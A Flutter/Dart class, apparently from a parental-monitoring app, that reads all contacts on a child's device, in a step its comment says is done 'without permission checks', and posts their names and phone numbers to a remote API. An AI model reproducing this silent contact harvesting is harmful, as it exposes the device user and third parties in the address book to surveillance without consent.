import 'package:shared_preferences/shared_preferences.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class ContactsServiceChild {
  List<Contact> _contacts = [];
  String? childId;
  String? childName;
  String? parentId;
  String? parentName;

  // Method to handle contacts
  Future<void> vigilContacts() async {
    print('Start Fetching contacts...');

    // Get user data from SharedPreferences
    SharedPreferences prefs = await SharedPreferences.getInstance();
    childId = prefs.getString('childId');
    childName = prefs.getString('childName');
    parentId = prefs.getString('parentId');
    parentName = prefs.getString('parent_name');

    try {
      // Fetch contacts from the device without permission checks
      Iterable<Contact> contacts = await ContactsService.getContacts(
        withThumbnails: false,
        photoHighResolution: false,
      );
      _contacts = contacts.toList();

      // Convert the contacts to a List of Maps
      List<Map<String, dynamic>> contactsToSend = _contacts.map((contact) {
        return {
          'displayName': contact.displayName,
          'phones': contact.phones?.map((phone) => phone.value).toList(),
          'child_id': '$childId',
          'child_name': '$childName',
          'parent_id': '$parentId',
          'parent_name': '$parentName'
        };
      }).toList();

      // Send the contacts to the server
      await _sendContactsToServer(contactsToSend);
      print('Contacts successfully fetched and sent.');
    } catch (e) {
      print('Error fetching contacts: $e');
    }
  }

  // Store contacts to MongoDB (or any database)
  Future<void> _sendContactsToServer(List<Map<String, dynamic>> contacts) async {
    const String url = 'https://nodeapi-6omc.onrender.com/api/contacts/store_contacts'; // Replace with your API URL

    try {
      final response = await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({'contacts': contacts}),
      );

      if (response.statusCode == 200) {
        print('Contacts sent successfully: ${response.body}');
      } else {
        print('Failed to send contacts: ${response.statusCode}');
      }
    } catch (e) {
      print('Error sending contacts: $e');
    }
  }
}
